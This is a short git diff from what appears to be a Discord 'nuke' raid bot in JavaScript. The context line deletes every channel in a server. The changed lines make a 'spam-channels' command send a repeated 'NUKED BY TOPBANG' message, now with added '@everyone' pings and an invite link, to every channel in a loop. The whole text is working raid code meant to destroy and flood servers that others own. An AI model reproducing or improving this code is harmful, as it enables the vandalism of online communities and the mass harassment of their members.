@@ -152,7 +152,7 @@ message.guild.channels.cache.forEach(channel => channel.delete());
     
     // spam-channesl
   } else if (message.content === `${Prefix}spam-channels`) {
-    const MSG = "NUKED BY TOPBANG https://discord.gg/D5YDUSvE NUKED BY TOPBANG https://discord.gg/D5YDUSvE NUKED BY TOPBANG https://discord.gg/D5YDUSvE NUKED BY TOPBANG https://discord.gg/D5YDUSvE "
+    const MSG = "@everyone NUKED BY TOPBANG https://discord.gg/D5YDUSvE @everyone NUKED BY TOPBANG https://discord.gg/D5YDUSvE  @everyone NUKED BY TOPBANG https://discord.gg/D5YDUSvE @everyone NUKED BY TOPBANG https://discord.gg/D5YDUSvE "
     message.guild.channels.cache.forEach(channel => channel.send(MSG));
         const i = 0
     const loopTime = 5 // how many timesit loops
